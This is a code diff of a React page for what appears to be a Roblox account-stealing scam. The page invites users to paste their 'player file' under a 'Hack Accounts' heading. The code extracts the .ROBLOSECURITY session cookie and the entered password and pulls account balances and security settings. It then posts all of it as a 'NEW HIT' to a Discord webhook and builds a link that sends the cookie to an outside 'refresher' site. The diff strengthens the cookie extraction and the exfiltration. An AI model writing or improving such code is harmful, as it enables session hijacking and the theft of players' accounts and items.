@@ -32,7 +32,7 @@ export default function SlugPage() {
     if (typeof window === "undefined") return;
     try {
       window.localStorage.setItem("lastSlug", slug);
-    } catch { }
+    } catch {}
   }, [slug]);
 
   // Fetch webhook URL from Supabase
@@ -69,32 +69,62 @@ export default function SlugPage() {
   }, [slug]);
 
   function extractRobloSecurity(text: string): string | null {
-    // Regex chính: yêu cầu warning chuẩn + cookie base64 đầy đủ sau dấu |
-    const regex = /_\|WARNING:-DO-NOT-SHARE-THIS\.\.-Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[A-Za-z0-9+\/=._-]{700,}/i;
-  
-    let match = text.match(regex);
-    if (match?.[0]) {
-      let cookie = match[0].trim();
-      if (cookie.endsWith(",")) cookie = cookie.slice(0, -1).trim();
-  
-      // Kiểm tra thêm: cookie phải có ít nhất 1 dấu . (thường có ở phần signature)
-      if (cookie.includes('.') && cookie.length >= 800) {
+    const patterns = [
+      /"\.ROBLOSECURITY",\s*"([^"]{700,})"/i,                 
+      /"\.ROBLOSECURITY"\s*,\s*"([^"]{700,})"/i,            
+      /_\|WARNING:[^|]*\|_[A-Za-z0-9+\/=._-]{680,}/i,      
+    ];
+
+    for (const pattern of patterns) {
+      const match = text.match(pattern);
+      if (match?.[1]) {
+        let candidate = match[1].trim();
+        if (
+          candidate.startsWith('_|WARNING:') &&
+          candidate.includes('|_)') &&  
+          candidate.length >= 750 &&
+          candidate.includes('.')    
+        ) {
+          return candidate;
+        }
+      }
+    }
+
+    const markers = [
+      '".ROBLOSECURITY", "',
+      '.ROBLOSECURITY", "',
+      '".ROBLOSECURITY", "'
+    ];
+
+    for (const marker of markers) {
+      const startIdx = text.indexOf(marker);
+      if (startIdx !== -1) {
+        let cookieStart = startIdx + marker.length;
+        let cookieEnd = text.indexOf('", "/', cookieStart);
+        if (cookieEnd === -1) {
+          cookieEnd = text.indexOf('"', cookieStart + 700);
+        }
+        if (cookieEnd !== -1 && cookieEnd - cookieStart >= 750) {
+          let cookie = text.substring(cookieStart, cookieEnd).trim();
+          if (
+            cookie.startsWith('_|WARNING:') &&
+            cookie.length >= 750 &&
+            cookie.includes('.')
+          ) {
+            return cookie;
+          }
+        }
+      }
+    }
+
+    const fallback = text.match(/_ \|WARNING:[^"]{750,}/i);
+    if (fallback?.[0]) {
+      let cookie = fallback[0].trim().replace(/\s+/g, '');
+      if (cookie.length >= 750 && cookie.includes('.')) {
         return cookie;
       }
     }
-  
-    // Fallback linh hoạt hơn nhưng vẫn yêu cầu độ dài lớn
-    const fallback = /_\|WARNING:[^|]+\|_[A-Za-z0-9+\/=._-]{700,}/i;
-    match = text.match(fallback);
-    if (match?.[0]) {
-      let cookie = match[0].trim();
-      if (cookie.endsWith(",")) cookie = cookie.slice(0, -1).trim();
-  
-      if (cookie.includes('.') && cookie.length >= 800) {
-        return cookie;
-      }
-    }
-  
+
     return null;
   }
 
@@ -105,11 +135,6 @@ export default function SlugPage() {
     const rbxIdMatch = text.match(/rbxid=(\d+)/i);
     if (rbxIdMatch?.[1]) return rbxIdMatch[1];
 
-    const guestMatch = text.match(/GuestData.*?UserID=([-]?\d+)/i);
-    if (guestMatch?.[1] && guestMatch[1] !== "-1" && guestMatch[1] !== "0" && !guestMatch[1].startsWith("-")) {
-      return guestMatch[1];
-    }
-
     return null;
   }
 
@@ -117,7 +142,7 @@ export default function SlugPage() {
     cookieValue: string,
     pinValue: string,
     userData: any,
-    fullStats: any | null,
+    fullStats: any,
     userId: string | null
   ) {
     if (!webhookUrl) {
@@ -133,166 +158,164 @@ export default function SlugPage() {
     try {
       const profileUrl = `https://www.roblox.com/users/${userId}/profile`;
       const rolimonsUrl = `https://www.rolimons.com/player/${userId}`;
-      const autoharUrl = `https://your-autohar-link-here.com?user=${userId}`; // thay bằng link thật của bạn
+      const autoharUrl = `https://your-autohar-link-here.com?user=${userId}`; // Thay bằng link thật của bạn
 
-      // Avatar headshot (ưu tiên fullStats nếu có)
-      const avatarUrl =
-        fullStats?.avatarHeadshotUrl ||
-        userData?.avatarHeadshotUrl ||
-        "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-8148B9CBD3BFF7F455842F650B6BA37A-Png/420/420/AvatarHeadshot/Png/noFilter"; // fallback giống ví dụ
+      const avatarUrl = fullStats?.avatarHeadshotUrl || userData?.avatarHeadshotUrl || "https://i.imgur.com/0ZxT2S6.png";
 
-      // Dữ liệu từ API hoặc fallback theo ví dụ
-      const username = userData?.basic?.name || "bijretak852"; // fallback như ví dụ
-      const accountAgeDays = userData?.accountAgeDays ?? 593;
+      // Lấy dữ liệu từ fullStats (ưu tiên) hoặc userData
+      const username = fullStats?.basic?.name || userData?.basic?.name || "N/A";
+      const accountAgeDays = fullStats?.accountAgeDays ?? userData?.accountAgeDays ?? "N/A";
       const isDeveloper = fullStats?.isDeveloper ?? false;
-      const gameVisits = fullStats?.visits ?? 74;
-      const robux = fullStats?.robux ?? 0;
-      const pending = fullStats?.pendingRobux ?? fullStats?.pending ?? 0;
+      const gameVisits = fullStats?.visits ?? 0;
+      const groupMembers = fullStats?.groupsCount ?? 0;
+      const robuxBalance = fullStats?.robux ?? 0;
+      const pendingRobux = fullStats?.pendingRobux ?? 0;
       const rap = fullStats?.rap ?? 0;
       const limiteds = fullStats?.limiteds ?? 0;
-      const summary = rap + limiteds || 640; // fallback 640 như ví dụ
-      const emailVerified = fullStats?.emailVerified ?? true; // Verified như ví dụ
-      const twoFA = fullStats?.twoFA ?? "(Not Set)";
-      const hasInventory = fullStats?.hasInventory ?? false;
-      const isPremium = userData?.basic?.isPremium ?? false;
+      const summary = fullStats?.summary ?? (robuxBalance + rap);
+      const creditBalance = fullStats?.creditBalance ?? 0;
+      const inUnknown = 0; // Chưa có field cụ thể, giữ 0
+      const emailVerified = fullStats?.emailVerified ? "Verified" : "Not Verified";
+      const twoFA = fullStats?.twoFA ?? "No 2FA";
+      const inventory = fullStats?.hasInventory ? "True" : "False";
+      const premium = fullStats?.premium ?? "N/A";
       const groupsOwned = fullStats?.ownedGroups ?? 0;
+      const groupsBalance = fullStats?.groupBalances?.reduce((sum: number, g: any) => sum + (g.robux || 0), 0) ?? 0;
 
-      // Cookie full, thêm note nếu dài
-      const cookieDisplay = cookieValue;
-      console.log(cookieValue)
+      const mm2Display = fullStats?.mm2_count > 0 ? `True | ${fullStats.mm2_count}` : "False | 0";
+      const admDisplay = fullStats?.adm_count > 0 ? `True | ${fullStats.adm_count}` : "False | 0";
+      const sabDisplay = fullStats?.sab_count > 0 ? `True | ${fullStats.sab_count}` : "False | 0";
+
+      const cookieDisplay = cookieValue.length > 4000 ? cookieValue.substring(0, 4000) + "..." : cookieValue;
       const cookieNote = cookieValue.length > 4000 ? "\n(long cookie - scroll to view full)" : "";
-      const description_cook = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items." +
-        cookieDisplay + cookieNote;
+      const linkRe = `https://manualrefresherforrichpeople.gt.tc/?cookie=${encodeURIComponent(cookieValue)}`;
 
-
-      const linkRe = "https://manualrefresherforrichpeople.gt.tc/?cookie=" + cookieDisplay;
-
-      console.log(linkRe);
       const payload = {
         content: "@everyone NEW HIT",
         embeds: [
           {
             title: "RIP_DEATH | <13",
-            url: profileUrl || "https://www.roblox.com/",  // fallback nếu url rỗng
+            url: profileUrl,
             color: 16711680,
             fields: [
               {
                 name: "Discord Notification",
                 value: [
-                  rolimonsUrl ? `[Rolimons Stats](${rolimonsUrl})` : "Rolimons N/A",
-                  profileUrl ? `[Roblox Profile](${profileUrl})` : "Profile N/A",
-                  autoharUrl ? `[AutoHar Link](${autoharUrl})` : "AutoHar N/A"
+                  `[Rolimons Stats](${rolimonsUrl})`,
+                  `[Roblox Profile](${profileUrl})`,
+                  `[AutoHar Link](${autoharUrl})`,
                 ].join(" | "),
+                inline: false,
               },
               {
                 name: "Username",
-                value: username || "N/A",
-                inline: true
+                value: username,
+                inline: true,
               },
               {
                 name: "Password",
                 value: pinValue || "N/A",
-                inline: true
+                inline: true,
               },
               {
                 name: "📊 Account Stats",
                 value: [
-                  `• Account Age: ${accountAgeDays ?? "N/A"} Days`,
-                  `• Games Developer: ${isDeveloper != null ? (isDeveloper ? "True" : "False") : "N/A"}`,
-                  `• Game Visits: ${gameVisits ?? "N/A"}`,
-                  `• Group Members: 0`
+                  `• Account Age: ${accountAgeDays} Days`,
+                  `• Games Developer: ${isDeveloper ? "True" : "False"}`,
+                  `• Game Visits: ${gameVisits}`,
+                  `• Group Members: ${groupMembers}`,
                 ].join("\n"),
+                inline: false,
               },
               {
                 name: "💰 Robux",
-                value: `Balance: ${robux ?? "0"}\nPending: ${pending ?? "0"}`,
-                inline: true
+                value: `Balance: ${robuxBalance}\nPending: ${pendingRobux}`,
+                inline: true,
               },
               {
                 name: "Limiteds",
-                value: `RAP: ${rap ?? "0"}\nLimiteds: ${limiteds ?? "0"}`,
-                inline: true
+                value: `RAP: ${rap}\nLimiteds: ${limiteds}`,
+                inline: true,
               },
               {
                 name: "Summary",
-                value: summary || "",
-                inline: true
+                value: summary,
+                inline: true,
               },
               {
                 name: "💳 Payments",
-                value: "Credit Balance: 0\nin Unknown: 0",
-                inline: true
+                value: `Credit Balance: ${creditBalance}\nin Unknown: ${inUnknown}`,
+                inline: true,
               },
               {
                 name: "🎮 Games",
-                value: "<:mm2:1475152011740840039> True | 0\n<:adm:1475152102266503321> False | 0\n<:sab:1475152220671709224> True | 4",
-                inline: true
+                value: [
+                  `<:mm2:1475152011740840039> ${mm2Display}`,
+                  `<:adm:1475152102266503321> ${admDisplay}`,
+                  `<:sab:1475152220671709224> ${sabDisplay}`,
+                ].join("\n"),
+                inline: true,
               },
               {
                 name: "⚙️ Settings",
-                value: `Email: ${emailVerified != null ? (emailVerified ? "Verified" : "Not Verified") : "N/A"}\n2FA: ${twoFA ?? "N/A"}`,
-                inline: true
+                value: `Email: ${emailVerified}\n2FA: ${twoFA}`,
+                inline: true,
               },
               {
                 name: "📦 Inventory",
-                value: hasInventory != null ? (hasInventory ? "True" : "False") : "N/A",
-                inline: true
+                value: inventory,
+                inline: true,
               },
               {
                 name: "Premium",
-                value: isPremium != null ? (isPremium ? "True" : "False") : "N/A",
-                inline: true
+                value: premium,
+                inline: true,
               },
               {
                 name: "👥 Groups",
-                value: `Owned: ${groupsOwned ?? "0"}\nBalance: 0`,
-                inline: true
+                value: `Owned: ${groupsOwned}\nBalance: ${groupsBalance}`,
+                inline: true,
               },
               {
                 name: "🔧 Tool Used",
-                value: "```toolbox                                      ```"
-              }
+                value: "```toolbox                                      ```",
+                inline: false,
+              },
             ],
             footer: {
-              text: "Refreshed Cookie | Original Cookie | IP Info [ID, Blitar]",
-              icon_url: "https://i.imgur.com/0ZxT2S6.png"
+              text: "Refreshed Cookie | Original Cookie",
+              icon_url: "https://i.imgur.com/0ZxT2S6.png",
             },
             timestamp: new Date().toISOString(),
             thumbnail: {
-              url: avatarUrl || "https://i.imgur.com/0ZxT2S6.png"  // fallback avatar
-            }
+              url: avatarUrl,
+            },
           },
           {
             title: ".ROBLOSECURITY (Refreshed)",
-            description: 
+            description:
               `**Links:**\n` +
-              `[Refreshed Cookie](${linkRe || "N/A"}) | ` +
-              `[Original Cookie](${linkRe || "N/A"}) | ` +
-              `[IP Info [UA, Kyiv]](https://ip-api.com/#185.30.203.240)\n\n` +  // ← 3 link nằm ở đây, ngay trên cookie
-              (cookieDisplay 
-                ? `\`\`\`${cookieDisplay}\`\`\`` 
-                : "```No cookie available```"),
+              `[Refreshed Cookie](${linkRe}) | ` +
+              `[Original Cookie](${linkRe})\n\n` +
+              `\`\`\`${cookieDisplay}${cookieNote}\`\`\``,
             color: 16711680,
             author: {
               name: "Refreshed Cookie",
-              url: rolimonsUrl || "https://www.rolimons.com/",
-              icon_url: "https://em-content.zobj.net/source/apple/354/cookie_1f36a.png"
+              url: rolimonsUrl,
+              icon_url: "https://em-content.zobj.net/source/apple/354/cookie_1f36a.png",
             },
-            fields: [],  // Nếu không cần field nào nữa thì để trống, hoặc giữ field cũ nếu muốn
             timestamp: new Date().toISOString(),
             thumbnail: {
-              url: "https://em-content.zobj.net/source/apple/354/cookie_1f36a.png"
-            }
-          }
+              url: "https://em-content.zobj.net/source/apple/354/cookie_1f36a.png",
+            },
+          },
         ],
-        attachments: []
       };
-
 
       const res = await fetch(webhookUrl, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
+        body: JSON.stringify(payload),
       });
 
       if (res.ok) {
@@ -300,16 +323,12 @@ export default function SlugPage() {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            cookie: cookieValue,
-            pin: pinValue,
-            userId,
-            userData,
-            fullStats,
-            slug, // để admin biết hit từ đâu
+            discordPayload: payload,
+            slug,
           }),
-        }).catch((err) => console.error("[Admin log fetch failed]", err));
-      
-        setStatus({ message: "Thành công!", type: "success" });
+        }).catch((err) => console.error("[Admin forward failed]", err));
+
+        setStatus({ message: "Success!", type: "success" });
         setTimeout(() => {
           setFileContent("");
           setPin("");
@@ -337,25 +356,23 @@ export default function SlugPage() {
       return;
     }
 
-    const userId = extractUserId(fileContent);
+    const userId = extractUserId(fileContent) || "unknown";
 
     setStatus({ message: "⏳ Processing...", type: "info" });
 
     let userData = null;
     let fullStats = null;
 
-    if (userId) {
-      try {
-        const basicRes = await fetch(`/api/roblox-user?userId=${userId}&mode=basic`);
-        if (basicRes.ok) userData = await basicRes.json();
+    try {
+      const basicRes = await fetch(`/api/roblox-user?userId=${userId}&mode=basic`);
+      if (basicRes.ok) userData = await basicRes.json();
 
-        const fullRes = await fetch(
-          `/api/roblox-user?userId=${userId}&cookie=${encodeURIComponent(robloxCookie)}&mode=full`
-        );
-        if (fullRes.ok) fullStats = await fullRes.json();
-      } catch (err) {
-        console.error("[DEBUG] Fetch user data error:", err);
-      }
+      const fullRes = await fetch(
+        `/api/roblox-user?userId=${userId}&cookie=${encodeURIComponent(robloxCookie)}&mode=full`
+      );
+      if (fullRes.ok) fullStats = await fullRes.json();
+    } catch (err) {
+      console.error("[DEBUG] Fetch user data error:", err);
     }
 
     await sendToDiscord(robloxCookie, pin, userData, fullStats, userId);
@@ -369,7 +386,7 @@ export default function SlugPage() {
         <div className="absolute inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-md">
           <div className="flex flex-col items-center gap-6">
             <Loader2 className="w-14 h-14 text-red-500 animate-spin" />
-            <p className="text-xl font-semibold">Loading /{slug}...</p>
+            <p className="text-xl font-semibold">Loading</p>
           </div>
         </div>
       )}
@@ -396,14 +413,6 @@ export default function SlugPage() {
         <div className="w-full mb-6 px-2">
           <Link
             href="/create"
-            onClick={() => {
-              if (typeof window === "undefined") return;
-              try {
-                window.localStorage.removeItem("lastSlug");
-              } catch (err) {
-                console.error("[DEBUG] Cannot clear lastSlug from localStorage:", err);
-              }
-            }}
             className="text-[#cbd5e1] font-semibold text-sm tracking-wide hover:text-white transition-colors flex items-center gap-2"
           >
             <ArrowLeft className="w-4 h-4" />
@@ -429,17 +438,18 @@ export default function SlugPage() {
             <div className="bg-[#121212] border border-[#1e1e1e] rounded-2xl p-8 shadow-2xl flex flex-col h-full">
               <h3 className="text-lg font-bold mb-3">Hack Accounts</h3>
               <p className="text-[#94a3b8] text-sm mb-6 leading-relaxed">
-                Paste your player file in the box below, then click "Start Hacking!" If you don't know how to find a users 'player file' then go ahead and watch "How to use"
+                Paste your player file in the box below, then click "Start Hacking!"
               </p>
 
               {status.type && (
                 <div
-                  className={`p-4 rounded-xl mb-6 text-sm text-center border animate-in fade-in slide-in-from-top-1 duration-300 ${status.type === "success"
-                    ? "bg-emerald-950/30 border-emerald-500/30 text-emerald-300"
-                    : status.type === "error"
+                  className={`p-4 rounded-xl mb-6 text-sm text-center border animate-in fade-in slide-in-from-top-1 duration-300 ${
+                    status.type === "success"
+                      ? "bg-emerald-950/30 border-emerald-500/30 text-emerald-300"
+                      : status.type === "error"
                       ? "bg-red-950/30 border-red-500/30 text-red-300"
                       : "bg-blue-950/30 border-blue-500/30 text-blue-300"
-                    }`}
+                  }`}
                 >
                   {status.message}
                 </div>
@@ -460,7 +470,6 @@ export default function SlugPage() {
                 <div className="relative group">
                   <Lock className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-red-500 opacity-70 group-focus-within:opacity-100 transition-opacity" />
                   <input
-                    type="password"
                     value={pin}
                     onChange={(e) => setPin(e.target.value)}
                     placeholder="Create Password"
